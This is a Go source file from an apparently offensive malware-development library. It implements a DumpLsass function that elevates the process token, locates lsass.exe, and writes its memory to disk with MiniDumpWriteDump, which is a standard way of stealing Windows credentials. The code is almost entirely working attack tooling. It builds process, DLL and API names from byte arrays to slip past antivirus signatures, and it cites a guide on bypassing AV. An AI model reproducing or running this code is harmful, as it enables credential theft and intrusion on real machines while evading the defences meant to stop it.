package evasion

/*

References:
https://github.com/calebsargent/GoProcDump
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass

*/

import (
	"os"
	"golang.org/x/sys/windows"
	"unsafe"

	mproc "github.com/D3Ext/maldev/src/process"
)

func DumpLsass(output_file string) error {
	err := ElevateProcessToken()
	if err != nil {
		return err
	}

	all_lsass_pids, err := mproc.FindPidByName(string([]byte{'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e'}))
	if err != nil {
		return err
	}
	lsass_pid := all_lsass_pids[0]

  kernel32 := windows.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
  dbghelp := windows.NewLazyDLL(string([]byte{'D', 'b', 'g', 'h', 'e', 'l', 'p', '.', 'd', 'l', 'l'}))

  MiniDumpWriteDump := dbghelp.NewProc(string([]byte{'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p'}))
  OpenProcess := kernel32.NewProc(string([]byte{'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's'}))
  CreateFileW := kernel32.NewProc(string([]byte{'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W'}))

	pHandle, _, _ := OpenProcess.Call(
		uintptr(0xFFFF),
		uintptr(1),
		uintptr(lsass_pid),
	)

	// Create memory dump
	os.Create(output_file)

	path, err := windows.UTF16PtrFromString(output_file)
  if err != nil {
    return err
  }

	fHandle, _, _ := CreateFileW.Call(
		uintptr(unsafe.Pointer(path)),
		windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		0,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)

	ret, _, err := MiniDumpWriteDump.Call(
		uintptr(pHandle),
		uintptr(lsass_pid),
		uintptr(fHandle),
		0x00061907,
		0,
		0,
		0,
	)

	if ret == 0 {
		os.Remove(output_file)
		return err
	}

	return nil
}

